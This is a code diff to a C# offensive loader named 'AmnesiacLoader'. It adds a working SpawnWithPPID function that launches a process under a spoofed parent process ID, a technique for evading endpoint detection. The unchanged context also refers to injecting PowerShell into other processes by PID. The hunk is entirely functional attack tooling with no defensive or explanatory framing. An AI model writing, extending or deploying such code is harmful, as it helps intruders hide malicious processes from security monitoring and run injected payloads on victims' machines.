@@ -509,6 +509,51 @@ namespace AmnesiacLoader
             catch { return false; }
         }
 
+        // ── SpawnWithPPID — create process with spoofed parent, no suspension/APC ──
+
+        public static bool SpawnWithPPID(string cmdLine, int spoofParentPid)
+        {
+            try
+            {
+                IntPtr parentHandle = OpenProcess(PROCESS_ALL_ACCESS, false, spoofParentPid);
+                if (parentHandle == IntPtr.Zero) return false;
+
+                IntPtr attrListSize = IntPtr.Zero;
+                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrListSize);
+                IntPtr attrList = Marshal.AllocHGlobal(attrListSize.ToInt32());
+                if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref attrListSize))
+                { Marshal.FreeHGlobal(attrList); CloseHandle(parentHandle); return false; }
+
+                GCHandle pin = GCHandle.Alloc(parentHandle, GCHandleType.Pinned);
+                UpdateProcThreadAttribute(
+                    attrList, 0,
+                    new IntPtr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
+                    pin.AddrOfPinnedObject(),
+                    new IntPtr(IntPtr.Size),
+                    IntPtr.Zero, IntPtr.Zero);
+
+                var si = new STARTUPINFOEX();
+                si.StartupInfo.cb  = Marshal.SizeOf(typeof(STARTUPINFOEX));
+                si.lpAttributeList = attrList;
+
+                PROCESS_INFORMATION pi;
+                bool created = CreateProcessW(
+                    null, cmdLine,
+                    IntPtr.Zero, IntPtr.Zero, false,
+                    EXTENDED_STARTUPINFO_PRESENT,
+                    IntPtr.Zero, null, ref si, out pi);
+
+                pin.Free();
+                DeleteProcThreadAttributeList(attrList);
+                Marshal.FreeHGlobal(attrList);
+                CloseHandle(parentHandle);
+
+                if (created) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); }
+                return created;
+            }
+            catch { return false; }
+        }
+
         // ── CLR hosting wrappers (delegated to UnmanagedPS) ───────────────────────
 
         public static bool InjectUnmanagedPS(int pid, string psScript)
